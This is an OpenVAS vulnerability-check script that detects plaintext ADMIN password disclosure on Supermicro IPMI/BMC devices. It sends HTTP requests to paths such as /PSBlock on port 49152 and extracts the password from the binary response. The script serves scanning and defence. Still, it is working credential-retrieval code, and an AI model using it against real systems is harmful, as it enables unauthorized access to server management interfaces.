###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_supermicro_bmc_06_14.nasl 9587 2018-04-24 12:50:26Z cfischer $
#
# Supermicro IPMI/BMC Plaintext Password Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_insight = "BMCs in Supermicro motherboards contain a binary file that stores
remote login passwords in clear text. This file could be retrieved by requesting
/PSBlock on port 49152";

tag_impact = "Successful exploitation will allow attackers to obtain sensitive information
that may aid in further attacks";

tag_affected = "Motherboards manufactured by Supermicro";

tag_summary = "Supermicro IPMI/BMC Plaintext Password Disclosure";
tag_solution = "Ask the vendor for an update.";
tag_vuldetect = "Send a HTTP GET request and check the response.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105049");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 9587 $");

 script_name("Supermicro IPMI/BMC Plaintext Password Disclosure");

 script_xref(name:"URL", value:"http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/");
 
 script_tag(name:"last_modification", value:"$Date: 2018-04-24 14:50:26 +0200 (Tue, 24 Apr 2018) $");
 script_tag(name:"creation_date", value:"2014-06-20 18:08:51 +0200 (Fri, 20 Jun 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 49152);

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("dump.inc");

function get_pass( data )
{
  if( ! data ) return FALSE;

  off = stridx( data, "ADMIN" );
  pass = eregmatch( pattern:"^([[:print:]]+)", string: substr( data, off + 5 + 11 ) );

  if( isnull( pass[1] ) ) return FALSE;

  return pass[1];

}

port = get_http_port( default:49152 );
if( ! get_port_state( port ) ) exit( 0 );

url = '/IPMIdevicedesc.xml';
req = http_get( item:url, port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "supermicro" >!< buf ) exit( 99 );

urls = make_list( '/PSBlock', '/PSStore', '/PMConfig.dat', '/wsman/simple_auth.passwd' );

foreach url ( urls )
{  
  req = http_get( item:url, port:port );
  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
  if( buf =~ "HTTP/1.. 200" && "ADMIN" >< buf && "octet-stream" >< buf )
  {
    if( pass = get_pass( data:buf ) )
    {
      report = 'By requesting the url ' + url + ' it was possible to retrieve the password "' + pass + '" for the user "ADMIN"';
      expert_info = 'Request:\n' + req + 'Response (hexdump):\n' + hexdump( ddata:substr( buf, 0, 600 ) ) + '[truncated]\n'; 
      security_message( port:port, data:report, expert_info:expert_info );
      exit( 0 );
    }
  }  
}

exit( 99 );

